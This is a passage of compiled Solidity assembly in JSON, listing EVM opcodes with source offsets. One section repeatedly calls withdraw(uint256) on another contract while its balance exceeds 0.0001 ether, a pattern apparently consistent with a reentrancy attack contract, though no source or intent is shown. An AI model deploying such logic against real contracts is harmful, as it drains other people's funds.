											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1677,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1663,
											"end": 1704,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1663,
											"end": 1704,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1725,
											"end": 1726,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1719,
											"end": 1722,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1719,
											"end": 1726,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1715,
											"end": 1919,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1715,
											"end": 1919,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 1715,
											"end": 1919,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1772,
											"end": 1787,
											"name": "PUSH",
											"source": 1,
											"value": "5AF3107A4000"
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1754,
											"end": 1760,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1746,
											"end": 1769,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1746,
											"end": 1769,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1746,
											"end": 1769,
											"name": "BALANCE",
											"source": 1
										},
										{
											"begin": 1746,
											"end": 1787,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1806,
											"end": 1808,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1817,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1806,
											"end": 1817,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1817,
											"name": "PUSH",
											"source": 1,
											"value": "2E1A7D4D"
										},
										{
											"begin": 1818,
											"end": 1833,
											"name": "PUSH",
											"source": 1,
											"value": "5AF3107A4000"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1806,
											"end": 1834,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1871,
											"end": 1873,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1882,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1871,
											"end": 1882,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1882,
											"name": "PUSH",
											"source": 1,
											"value": "2E1A7D4D"
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1891,
											"end": 1897,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1883,
											"end": 1906,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1883,
											"end": 1906,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1883,
											"end": 1906,
											"name": "BALANCE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1871,
											"end": 1907,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 1743,
											"end": 1907,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1715,
											"end": 1919,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 1715,
											"end": 1919,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1626,
											"end": 1926,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 798,
											"end": 1931,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1511,
											"end": 1610,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1097,
											"end": 1392,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1400,
											"end": 1503,
											"name": "MLOAD",
											"source": 1
										},
										{
